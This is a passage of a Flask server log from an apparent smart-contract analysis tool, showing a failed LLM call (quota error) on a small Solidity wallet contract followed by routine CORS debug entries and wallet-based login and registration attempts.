dangereux)\\n    function changeOwner(address newOwner) external {\\n        require(msg.sender == owner, \\"Not authorized\\");\\n        owner = newOwner;\\n    }\\n\\n    // Lire le solde du contrat\\n    function getContractBalance() external view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': "ERROR: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}", 'reasoning': '', 'summary': '', 'code': '', 'code_type': 'solidity', 'duration': 3.663039207458496}
2025-07-09 10:04:29,419 - services.contract_service - INFO - Has exploit code: False
2025-07-09 10:04:29,419 - services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-09 10:04:29,419 - services.contract_service - INFO - Final vulnerability determination: False
2025-07-09 10:04:29,419 - services.contract_service - INFO - Attack strategy summary: 
2025-07-09 10:04:29,419 - services.contract_service - INFO - Analysis completed with status: OK
2025-07-09 10:04:29,419 - services.contract_service - INFO - Temporary file /tmp/tmpram52_yh.sol removed
2025-07-09 10:04:29,431 - api.contract - INFO - Report saved with filename: SimpleWallet_2025-07-09_10-04, status: OK
2025-07-09 10:04:29,431 - api.contract - INFO - Analysis completed successfully, returning report
2025-07-09 10:04:29,431 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:04:29,431 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 10:04:29,431 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:04:29,431 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:04:31,033 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:04:31,033 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 10:04:31,033 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:04:31,033 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:43:41,169 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-09 10:43:41,282 - app - INFO - Application started
2025-07-09 10:47:50,323 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:47:50,323 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:47:50,324 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:47:50,324 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 10:47:50,345 - api.auth - INFO - Received login request with method: POST
2025-07-09 10:47:50,345 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '35', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:47:50,345 - api.auth - INFO - Request content type: application/json
2025-07-09 10:47:50,345 - api.auth - INFO - Processing JSON request
2025-07-09 10:47:50,346 - api.auth - INFO - Attempting to authenticate user with wallet: test
2025-07-09 10:47:50,365 - api.auth - WARNING - Invalid credentials for wallet: test, error: Invalid credentials
2025-07-09 10:47:50,365 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:47:50,365 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:47:50,365 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:47:50,366 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:48:51,310 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:48:51,310 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:48:51,310 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:48:51,310 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 10:48:51,334 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:48:51,334 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '129', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:48:51,335 - api.auth - INFO - Request content type: application/json
2025-07-09 10:48:51,335 - api.auth - INFO - Processing JSON request
2025-07-09 10:48:51,335 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:48:51,487 - api.auth - INFO - Registration successful for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:48:51,487 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:48:51,487 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:48:51,487 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:48:51,487 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:49:01,147 - api.auth - INFO - Received login request with method: POST
2025-07-09 10:49:01,147 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:49:01,147 - api.auth - INFO - Request content type: application/json
2025-07-09 10:49:01,147 - api.auth - INFO - Processing JSON request
2025-07-09 10:49:01,147 - api.auth - INFO - Attempting to authenticate user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:49:01,296 - api.auth - INFO - Authentication successful for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:49:01,297 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:49:01,297 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:49:01,297 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:49:01,297 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:52:47,270 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-09 10:52:47,388 - app - INFO - Application started
2025-07-09 10:55:14,891 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:14,892 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:14,892 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:14,892 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:14,892 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:14,911 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:14,912 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:14,912 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:14,912 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:14,912 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:16,736 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:16,736 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:16,736 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:16,736 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:16,737 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:16,742 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:16,742 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:16,743 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:16,743 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:16,743 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:17,189 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:17,189 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:17,189 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:17,190 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:17,190 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:17,199 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:17,200 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:17,200 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:17,200 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:17,200 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:17,333 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:17,333 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:17,334 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:17,334 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:17,334 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:17,339 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:17,339 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:17,339 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:17,339 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:17,339 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:17,477 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:17,477 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:17,477 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:17,477 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:17,477 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:17,481 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:17,481 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:17,481 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:17,482 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
